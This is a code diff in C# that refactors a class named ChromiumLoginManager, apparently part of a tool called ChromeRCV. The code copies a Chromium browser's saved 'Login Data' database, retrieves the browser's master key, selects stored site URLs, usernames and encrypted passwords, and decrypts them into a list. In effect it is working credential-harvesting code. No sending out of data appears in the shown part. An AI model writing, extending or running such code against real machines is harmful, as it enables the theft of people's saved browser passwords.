@@ -46,10 +46,36 @@ namespace ChromeRCV
 
     internal sealed class ChromiumLoginManager
     {
-        public static void GetData(string loginDataPath, byte[] key, ref List<ChromiumLogin> logins)
+        private string _browser;
+        private string _browserPath;
+        private string _tempFile;
+        private byte[] _masterKey;
+
+        public string Browser
         {
-            string tempFile = Utils.CreateTempFile(loginDataPath);
-            using (SQLiteConnection conn = new SQLiteConnection("Data Source=" + tempFile + ";Version=3;New=True;Compress=True;")) {
+            get {
+                return _browser;
+            }
+        }
+
+        public ChromiumLoginManager() { }
+
+        public ChromiumLoginManager Reinitialize(string browserPath)
+        {
+            _browserPath = browserPath;
+            _masterKey = Crypt.GetMasterKey(browserPath + "\\User Data");
+            if(_masterKey == null)
+                return null;
+            
+            _browser = Utils.GetBrowserFromPath(browserPath);
+            _tempFile = Utils.CreateTempFile(_browserPath + "\\User Data\\Default\\Login Data");
+            return this;
+        }
+
+        public List<ChromiumLogin> GetData()
+        {
+            List<ChromiumLogin> logins = new List<ChromiumLogin>();
+            using (SQLiteConnection conn = new SQLiteConnection("Data Source=" + _tempFile + ";Version=3;New=True;Compress=True;")) {
                 conn.Open();
                 using (SQLiteCommand comm = conn.CreateCommand()) {
                     comm.CommandText = "SELECT origin_url, username_value, password_value FROM logins";
@@ -63,7 +89,7 @@ namespace ChromeRCV
                             var c = new ChromiumLogin();
                             c.Hostname = hostname;
                             c.Username = username;
-                            c.Password = Crypt.DecryptPassword(password, key);
+                            c.Password = Crypt.DecryptData(password, _masterKey);
                             logins.Add(c);
                         }
                     }
@@ -71,11 +97,12 @@ namespace ChromeRCV
                 conn.Close();
             }
             try {
-                File.Delete(tempFile);
+                File.Delete(_tempFile);
             }
             catch {
-                Console.WriteLine($"Failed to delete {tempFile.ToUpper()}");
+                Console.WriteLine($"Failed to delete {_tempFile.ToUpper()}");
             }
+            return logins;
         }
     }
 }
